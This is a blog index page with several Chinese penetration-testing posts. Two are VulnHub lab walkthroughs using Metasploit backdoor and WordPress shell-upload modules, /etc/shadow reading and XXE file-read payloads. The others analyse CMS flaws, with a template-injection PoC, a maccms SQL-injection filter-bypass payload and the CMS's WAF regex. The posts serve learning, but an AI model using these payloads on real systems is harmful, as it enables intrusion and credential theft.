<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://yoursite.com/page/5/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 4.2.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-pentests-Vulhub渗透测试" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/01/10/pentests-Vulhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="article-date">
  <time datetime="2020-01-10T06:44:43.000Z" itemprop="datePublished">2020-01-10</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/01/10/pentests-Vulhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">pentests-Vulhub渗透测试</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>vulnhub-BasicPentesting</p>
<p><img src="/.com//1.png" alt="image-20200112054958593"></p>
<p>靶机IP地址：192.168.139.131</p>
<p>kali IP地址：192.168.139.129</p>
<h1 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h1><p>首先先用nmap扫描端口</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -v -p <span class="number">1</span><span class="number">-65535</span> <span class="number">192.168</span><span class="number">.139</span><span class="number">.131</span></span><br></pre></td></tr></table></figure>

<p>然后可以看到这里有三个端口是开着的，分别是21(ftp),22(ssh),80(http)</p>
<p><img src="/.com//2.png" alt="image-20200112055153915"></p>
<p>这里有一个<code>proftp1.3.3c</code>，启动msf,我们打一个后门利用过去,成功getshell</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">exploit</span>/<span class="title">unix</span>/<span class="title">ftp</span>/<span class="title">proftpd_133c_backdoor</span></span><br><span class="line"><span class="title">set</span> <span class="title">rhosts</span> 192.168.139.131</span><br><span class="line"><span class="title">exploit</span></span><br></pre></td></tr></table></figure>

<p><img src="/.com//3.png" alt="image-20200112142829507"></p>
<p>然后搞点别的东西，这个不是作者的本意吧，就考这个？</p>
<p>我们扫描目录看看</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http:<span class="comment">//192.168.139.131</span></span><br></pre></td></tr></table></figure>

<p>然后发现一个secret目录，</p>
<p><img src="/.com//4.png" alt="image-20200112143633428"></p>
<p>访问这个目录，然后发现解析不了，我们看一下靶机的域名，然后修改一个hosts文件</p>
<p><img src="/.com//5.png" alt="image-20200112151622164"></p>
<p>这是一个wordpress</p>
<p><img src="/.com//6.png" alt="image-20200112151656894"></p>
<p>Wordpress渗透的思路：</p>
<p><strong>先得到账号密码登陆到后台getshell或者利用插件漏洞</strong></p>
<p>获得账号密码有两种方式</p>
<p>手动获取：输入地址:<code>vtcsec/secret/wp-login.php?author=1</code>，后面的author=1,2,3,4…..试到没有用户为止</p>
<p>​                   然后用top10的弱密码一个个的试。</p>
<p>自动获取：使用工具wpscan <code>wpscan –url http://www.xxx.com –U 用户名/字典 –P 密码/字典</code></p>
<p>获得账户/密码：admin/admin</p>
<p>使用msf上传shell</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">exploit</span>/<span class="title">unix</span>/<span class="title">webapp</span>/<span class="title">wp_admin_shell_upload</span></span><br><span class="line"><span class="title">set</span> <span class="title">rhosts</span> 192.168.139.131</span><br><span class="line"><span class="title">set</span> <span class="title">username</span> <span class="title">admin</span></span><br><span class="line"><span class="title">set</span> <span class="title">password</span> <span class="title">admin</span></span><br><span class="line"><span class="title">set</span> <span class="title">targeturi</span> /<span class="title">secret</span></span><br><span class="line"><span class="title">exploit</span></span><br></pre></td></tr></table></figure>

<p><img src="/.com//7.png" alt="image-20200112154651507"></p>
<p>发现shadow文件可读</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/shadow</span><br></pre></td></tr></table></figure>

<p><img src="/.com//9.png" alt="image-20200112162522345"></p>
<p>重要的是这个</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">marlinspike:$<span class="number">6</span>$wQb5nV3T$xB2WO/jOkbn4t1RUILrckw69LR/<span class="number">0</span>EMtUbFFCYpM3MUHVmtyYW9.ov/aszTpWhLaC2x6Fvy5tpUUxQbUhCKbl4/:<span class="number">17484</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br></pre></td></tr></table></figure>



<p>解密一下</p>
<p><img src="/.com//10.png" alt="image-20200112162522345"></p>
<p><img src="/.com//C:%5CUsers%5Ccookie%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200112213938733.png" alt="image-20200112213938733"></p>
<p>这个就是这台靶机的登录账号和密码</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>了解了一点点msf的使用</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/10/pentests-Vulhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-id="ck8sqr5k30015kou59wgifle9" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-某JA模块注入漏洞分析" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/01/09/%E6%9F%90JA%E6%A8%A1%E5%9D%97%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="article-date">
  <time datetime="2020-01-09T06:37:54.000Z" itemprop="datePublished">2020-01-09</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/01/09/%E6%9F%90JA%E6%A8%A1%E5%9D%97%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">某JA模块注入漏洞分析</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>某<code>JA</code>模块注入漏洞分析</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="1-POC"><a href="#1-POC" class="headerlink" title="1.POC"></a>1.POC</h2><p>先注册一个账号，然后在用户的地址管理处，添加新的地址信息，并且payload为<code>{$=phpinfo()}</code></p>
<p><img src="/.com//1.png" alt="image-20200110021037161"></p>
<p>接着访问<code>../wdja/passport/address/manage.php</code></p>
<p><img src="/.com//2.png" alt="image-20200110021257624"></p>
<h2 id="2-漏洞分析"><a href="#2-漏洞分析" class="headerlink" title="2.漏洞分析"></a>2.漏洞分析</h2><p>这是一个模块注入，导致的代码执行漏洞，从payload来看这里没有做出过滤等操作。</p>
<p>首先看到<code>index.php</code>，并且结合写入地址信息时，访问的<code>url</code>中的<code>action=add</code>，在<code>index.php</code>中调用了<code>wdja_cms_module_action()</code></p>
<p><img src="/.com//3.png" alt="image-20200110021950156"></p>
<p>跟进看一下，这里可看到<code>action=add</code>的时候，将会调用<code>wdja_cms_module_adddisp()</code></p>
<p><img src="/.com//4.png" alt="image-20200110022122198"></p>
<p>跟进<code>wdja_cms_module_adddisp()</code>看一下，可见这是在往数据库中添加数据</p>
<p><img src="/.com//5.png" alt="image-20200110022910798"></p>
<p>我们在<code>sql语句</code>后debug一下，看看这个语句操作的是哪个数据表。</p>
<p><img src="/.com//6.png" alt="image-20200110023054254"></p>
<p>然后回显是如下数据表。也就是说用户的地址信息等将会被存入这个表中。</p>
<p><img src="/.com//7.png" alt="image-20200110023149973"></p>
<p>然后我们看向<code>manage.php</code>，然后我们跟进，<code>$mybody</code>是我们回显<code>phpinfo()</code>的位置</p>
<p><img src="/.com//8.png" alt="image-20200110023642939"></p>
<p>跟进<code>wdja_cms_admin_manage()</code></p>
<p><img src="/.com//9.png" alt="image-20200110024319860"></p>
<p><img src="/.com//10.png" alt="image-20200110024402703"></p>
<p>然后跟进<code>wdja_cms_admin_manage_list()</code>,这里也用<code>die()</code>来看一下执行的<code>sql语句</code>是什么。</p>
<p><img src="/.com//11.png" alt="image-20200110024521969"></p>
<p><img src="/.com//12.png" alt="image-20200110025733103"></p>
<p>同一个数据表。</p>
<p>继续看到最下面，跟进<code>ii_creplace()</code></p>
<p><img src="/.com//13.png" alt="image-20200110025902644"></p>
<p><img src="/.com//14.png" alt="image-20200110030001499"></p>
<p><code>ii_creplace()</code>中对传入参数的要求就只有要满足<code>{\$=(.[^\}]*)}</code></p>
<p>跟进<code>ii_eval()</code>，发现漏洞触发点。</p>
<p><img src="/.com//15.png" alt></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/09/%E6%9F%90JA%E6%A8%A1%E5%9D%97%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" data-id="ck8sqr5ke001mkou50uefh3tz" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-XXE-Vulhub渗透测试" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/01/02/XXE-Vulhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="article-date">
  <time datetime="2020-01-02T15:30:44.000Z" itemprop="datePublished">2020-01-02</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/01/02/XXE-Vulhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">XXE-Vulhub渗透测试</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Vulhub-XXE渗透练习</p>
<p>目标：获取靶机Flag</p>
<p>运行环境：kali2019.4&amp;&amp;XXE靶机&amp;&amp;VMware15.X</p>
<h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><p>靶机打开后长这样….</p>
<p><img src="/.com//1.png" alt="image-20200102110918810"></p>
<p>然后我们要做的第一件事就是去扫靶机的IP地址，看看靶机的地址是多少。</p>
<p>下图中，我们使用<strong>netdiscover</strong>直接找到这个靶机的IP地址为<strong>192.168.139.130</strong></p>
<p><img src="/.com//2.png" alt="image-20200102111233017"></p>
<p>然后我们用nmap去扫描该靶机的IP，看看它有什么端口是开着的。</p>
<p>命令如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -v -p <span class="number">1</span><span class="number">-65535</span> <span class="number">192.168</span><span class="number">.139</span><span class="number">.130</span></span><br></pre></td></tr></table></figure>

<p><img src="/.com//3.png" alt="image-20200102170442262"></p>
<p>如上图所示，靶机的80端口和5355端口是开放的。然后我们访问80端口。</p>
<p><img src="/.com//4.png" alt="image-20200102173102954"></p>
<p>这是一个ubuntu的页面，没有值得利用的东西，我们扫描该站点目录。</p>
<p>使用dirsearch扫描该站点，发现robots.txt</p>
<p><img src="/.com//5.png" alt="image-20200102194359097"></p>
<p>访问robots.txt</p>
<p><img src="/.com//6.png" alt="image-20200102194454369"></p>
<p>访问admin.php无果，所以我们访问/xxe/</p>
<p><img src="/.com//7.png" alt="image-20200102194552349"></p>
<p>这个靶机的考察点在于xxe,所以我们就直接使用xxe的payload试试能不能弹出些东西来</p>
<p>payload</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.8" encoding="UTF-8"?&gt;</span>         </span><br><span class="line"><span class="meta">&lt;!DOCTYPE r [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT r <span class="meta-keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">admin</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;admin;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>123<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/.com//8.png" alt="image-20200102195855558"></p>
<p>用这个思路去获得刚才获取不到的admin.php,payload如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.8&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;         </span><br><span class="line">&lt;!DOCTYPE r [</span><br><span class="line">&lt;!ELEMENT r ANY&gt;</span><br><span class="line">&lt;!ENTITY admin SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;admin.php&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;root&gt;&lt;name&gt;&amp;admin;&lt;&#x2F;name&gt;&lt;password&gt;123&lt;&#x2F;password&gt;&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/.com//9.png" alt="image-20200102200431782"></p>
<p>base64解码后,获得php源码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$msg = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'login'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_POST[<span class="string">'username'</span>] == <span class="string">'administhebest'</span> &amp;&amp; md5($_POST[<span class="string">'password'</span>]) == <span class="string">'e6e061838856bf47e1de730719fb2609'</span>) &#123;</span><br><span class="line">        $_SESSION[<span class="string">'valid'</span>] = <span class="keyword">true</span>;</span><br><span class="line">        $_SESSION[<span class="string">'timeout'</span>] = time();</span><br><span class="line">        $_SESSION[<span class="string">'username'</span>] = <span class="string">'administhebest'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"You have entered valid use name and password &lt;br /&gt;"</span>;</span><br><span class="line">        $flag = <span class="string">"Here is the &lt;a style='color:FF0000;' href='/flagmeout.php'&gt;Flag&lt;/a&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">'Maybe Later'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进行MD5解密</p>
<p><img src="/.com//10.png" alt="image-20200102201331103"></p>
<p>但是这个并不管用….</p>
<p><img src="/.com//12.png" alt="image-20200102202244390"></p>
<p>扫描/xxe的目录</p>
<p><img src="/.com//11.png" alt="image-20200102201331103"></p>
<p>访问这个admin.php，然后填入用户名和密码，跳出一个红色的flag,访问试试，当时访问是500.所以用一样的xxe套路访问flagtimeout.php</p>
<p><img src="/.com//13.png" alt="image-20200102203011458"></p>
<p>解码获得：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"&lt;!-- the flag in (JQZFMMCZPE4HKWTNPBUFU6JVO5QUQQJ5) --&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>base32解码：</p>
<p><img src="/.com//14.png" alt="image-20200102203352059"></p>
<p>访问/ect/.flag.php</p>
<p><img src="/.com//15.png" alt="image-20200102203645462"></p>
<p>解码的结果如下：</p>
<p><img src="/.com//16.png" alt="image-20200102204232861"></p>
<p>这是一个webshell</p>
<p><img src="/.com//17.png" alt="image-20200102204750004"></p>
<p>获得flag</p>
<p><img src="/.com//XXE-Vulhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%5C18.png" alt="image-20200102210328465"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/02/XXE-Vulhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-id="ck8sqr5jf000qkou5b391fxe7" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-maccms8前台sql注入" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/12/28/maccms8%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/" class="article-date">
  <time datetime="2019-12-28T10:37:03.000Z" itemprop="datePublished">2019-12-28</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/12/28/maccms8%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/">maccms8前台sql注入</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>maccms前台sql注入复现现场…….</p>
<p>炒冷饭现场…….</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>据说这个地方有sql注入的漏洞</p>
<p><img src="/.com//1.png" alt="1577539664203"></p>
<p>同样的我们跟踪到vod.php</p>
<p>看到method=’search’</p>
<p><img src="/.com//2.png" alt="1577539921673"></p>
<p>通过be()方法获得wd.然后chkSql().对输入的语句进行sql检测…….</p>
<p>跟踪be(),这里可以通过POST,GET或者REQUEST方法获得wd.并且<strong>wd经过addslashes()的转义处理</strong></p>
<p><img src="/.com//3.png" alt="1577540175012"></p>
<p>回到vod.php然后我们跟一下chkSql(),该方法接收的变量$s(也就是我们传入的$wd)后,将会进行循环性的urldecode().直到解出原文为止,获得原文后在放入stopAttack()中.</p>
<p><img src="/.com//4.png" alt="1577540507644"></p>
<p>跟踪stopAttack(),使用$getfilter的匹配规则,去正则匹配检查$s的内容中是否有不安全字符.</p>
<p><img src="/.com//5.png" alt="1577541020879"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//get拦截规则</span></span><br><span class="line">$getfilter = <span class="string">"\\&lt;.+javascript:window\\[.&#123;1&#125;\\\\x|&lt;.*=(&amp;#\\d+?;?)+?&gt;|&lt;.*(data|src)=data:text\\/html.*&gt;|\\b(alert\\(|be\\(|eval\\(|confirm\\(|expression\\(|prompt\\(|benchmark\s*?\(.*\)|sleep\s*?\(.*\)|load_file\s*?\\()|&lt;[a-z]+?\\b[^&gt;]*?\\bon([a-z]&#123;4,&#125;)\s*?=|^\\+\\/v(8|9)|\\b(and|or)\\b\\s*?([\\(\\)'\"\\d]+?=[\\(\\)'\"\\d]+?|[\\(\\)'\"a-zA-Z]+?=[\\(\\)'\"a-zA-Z]+?|&gt;|&lt;|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\"'])|\\/\\*.*\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT(\\(.+\\)|\\s+?.+?)|UPDATE(\\(.+\\)|\\s+?.+?)SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE)(\\(.+\\)|\\s+?.+?\\s+?)FROM(\\(.+\\)|\\s+?.+?)|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)|UNION([\s\S]*?)SELECT|_get|_post|_request|_cookie|eval|assert|base64_decode|file_get_contents|file_put_contents|fopen|chr|strtr|pack|gzuncompress|preg_replace|\\&#123;if|\\&#123;else|\\&#123;|\\&#125;|:php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//post拦截规则</span></span><br><span class="line">$postfilter = <span class="string">"&lt;.*=(&amp;#\\d+?;?)+?&gt;|&lt;.*data=data:text\\/html.*&gt;|\\b(alert\\(|be\\(|eval\\(|confirm\\(|expression\\(|prompt\\(|benchmark\s*?\(.*\)|sleep\s*?\(.*\)|load_file\s*?\\()|&lt;[^&gt;]*?\\b(onerror|onmousemove|onload|onclick|onmouseover|eval)\\b|\\b(and|or)\\b\\s*?([\\(\\)'\"\\d]+?=[\\(\\)'\"\\d]+?|[\\(\\)'\"a-zA-Z]+?=[\\(\\)'\"a-zA-Z]+?|&gt;|&lt;|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\"'])|\\/\\*.*\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT(\\(.+\\)|\\s+?.+?)|UPDATE(\\(.+\\)|\\s+?.+?)SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE)(\\(.+\\)|\\s+?.+?\\s+?)FROM(\\(.+\\)|\\s+?.+?)|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)|UNION([\s\S]*?)SELECT|_get|_post|_request|_cookie|eval|assert|base64_decode|file_get_contents|file_put_contents|fopen|chr|strtr|pack|gzuncompress|preg_replace|\\&#123;if|\\&#123;else|\\&#123;|\\&#125;|:php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//cookie拦截规则</span></span><br><span class="line">$cookiefilter = <span class="string">"benchmark\s*?\(.*\)|sleep\s*?\(.*\)|be\\(|eval\\(|load_file\s*?\\(|\\b(and|or)\\b\\s*?([\\(\\)'\"\\d]+?=[\\(\\)'\"\\d]+?|[\\(\\)'\"a-zA-Z]+?=[\\(\\)'\"a-zA-Z]+?|&gt;|&lt;|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\"'])|\\/\\*.*\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT(\\(.+\\)|\\s+?.+?)|UPDATE(\\(.+\\)|\\s+?.+?)SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE)(\\(.+\\)|\\s+?.+?\\s+?)FROM(\\(.+\\)|\\s+?.+?)|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)|UNION([\s\S]*?)SELECT"</span>;</span><br></pre></td></tr></table></figure>

<p>但是过滤规则存在被绕过的可能性</p>
<p>回到函数chkSql()</p>
<p><img src="/.com//6.png" alt="1577541594748"></p>
<p>跟进这个htmlEncode($str)</p>
<p><img src="/.com//7.png" alt="1577541775727"></p>
<p>这里对&amp;，’，空格，”，TAB，回车，换行，大小于号进行实体化的转换，此处没有对其他的空白字符和反斜杠进行处理，可以被绕过。</p>
<p>然后我们回到这个vod.php中,再看这个代码,</p>
<p><img src="/.com//8.png" alt="1577549259547"></p>
<p>可以看到$tpl-&gt;P[“wd”]=$wd.来自我们输入的wd</p>
<p><img src="/.com//9.png" alt="1577549321671"></p>
<p>我们看到template.php中,case  vod中$lp[‘wd’]会得到wd的值.</p>
<p><img src="/.com//10.png" alt="1577549477058"></p>
<p>看看哪里用到了$lp[‘wd’].</p>
<p><img src="/.com//11.png" alt="1577549579042"></p>
<p>我们利用之前的addlashes()转义,并且这里的两处$lp[‘wd’].</p>
<p>最初我们的payload如下:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">||<span class="keyword">if</span>((select ascii(length((select(m_name) from(mac_manager))))=<span class="number">53</span>),(`sleep`(<span class="number">3</span>)),<span class="number">0</span>)<span class="comment">#\</span></span><br></pre></td></tr></table></figure>

<p><img src="/.com//12.png" alt="1577549958269"></p>
<p>这是一个字符型注入,第一个payload用来闭合前面的单引号,第二个用来注入.</p>
<p>然后根据前面的问题挨个绕过</p>
<p>addslashes()转义<code>\</code>成<code>\\</code>的问题,<code>htmlEncode</code>又会对前面的空格转义成<code></code>.</p>
<p>这里我们可以利用URL编码绕过<code>htmlEncode</code>，具体可以看HTML URL编码表<code>%0c</code> <code>%0b</code>等都可以，后面的<code>\</code>可以用URL编码绕过<code>%5c</code>或者双编码<code>%25%35%63</code></p>
<ol>
<li><p>那么我们构造成的payload就是下面的，功能是查询管理员账号字段的长度</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wd=))||<span class="keyword">if</span>((select%<span class="number">0</span>cascii(length((select(m_name)``from(mac_manager))))=<span class="number">53</span>),(`sleep`(<span class="number">3</span>)),<span class="number">0</span>)<span class="comment">#%25%35%63</span></span><br></pre></td></tr></table></figure>




</li>
</ol>
<p>我们现在后台添加一条数据,便于数据库做查询</p>
<p><img src="/.com//13.png" alt="1577552600523"></p>
<p>然后注入测试</p>
<p><img src="/.com//14.png" alt="1577552673071"></p>
<p><img src="/.com//15.png" alt="1577552701878"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>学习到了sql注入的一些技巧和构造方法,这个漏洞还是蛮有意思的.</p>
<p>闭合单引号的思路可以学习一下.</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/12/28/maccms8%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/" data-id="ck8sqr5ju0011kou59ies1eqr" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-maccms8-x命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/12/27/maccms8-x%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2019-12-27T01:37:59.000Z" itemprop="datePublished">2019-12-27</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/12/27/maccms8-x%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">maccms8.x命令执行漏洞</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>maccms8.x命令执行漏洞分析现场…..</p>
<p>先放上POC</p>
<p><img src="/.com//1.png" alt="1577410950946"></p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>根据POC,来到index.php</p>
